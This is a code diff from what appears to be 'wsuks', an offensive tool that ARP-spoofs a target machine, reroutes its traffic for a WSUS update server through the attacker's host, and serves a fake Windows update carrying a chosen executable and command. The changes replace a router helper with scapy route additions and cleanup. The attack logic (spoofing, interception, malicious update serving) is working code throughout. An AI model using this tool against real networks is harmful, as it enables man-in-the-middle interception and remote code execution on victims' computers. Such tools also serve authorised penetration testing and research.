@@ -8,7 +8,6 @@ import os
 from pprint import pformat
 import random
 from string import digits, ascii_letters
-from threading import Thread
 from scapy.all import get_if_addr, sniff, conf, IP, TCP, send
 from wsuks.helpers.arpspoofer import ArpSpoofer
 from wsuks.helpers.logger import initLogger
@@ -64,22 +63,17 @@ class Wsuks:
         else:
             self.logger.info(f"WSUS Server specified manually: {self.wsusIp}:{self.wsusPort}")
 
-        #print(conf.route)
-        #conf.route.add(host=self.wsusIp, gw=self.hostIp)
-        #print(conf.route)
-
         # Start Arp Spoofing
         arpspoofer = ArpSpoofer()
         arpspoofer.start(self.targetIp, self.wsusIp)
 
-        # Prepare WSUS Update Handler
-        router = Router()
-        router.start(self.targetIp, self.hostIp, self.wsusIp, self.interface)
+        print(conf.route)
+        conf.route.add(host=self.wsusIp, gw=self.hostIp)
+        print(conf.route)
 
-        #t1 = Thread(target=self.run_sniff, args=(self))
-        #t1.start()
-        #sniff(filter=f"tcp", prn=self.handlePacket, store=0, iface=self.args.interface)
-        #print("TEST")
+        # Prepare WSUS Update Handler
+        # router = Router()
+        # router.start(self.targetIp, self.hostIp, self.wsusIp, self.interface)
 
         update_handler = WSUSUpdateHandler(self.executable_file, self.executable_name, f'{self.hostIp}:{self.wsusPort}')
         update_handler.set_resources_xml(self.command)
@@ -96,7 +90,9 @@ class Wsuks:
             print("")
             self.logger.info("Stopping WSUS Server...")
         finally:
-            router.stop()
+            conf.route.resync()
+            print(conf.route)
+            # router.stop()
             arpspoofer.stop()
 
     def handlePacket(self, packet):
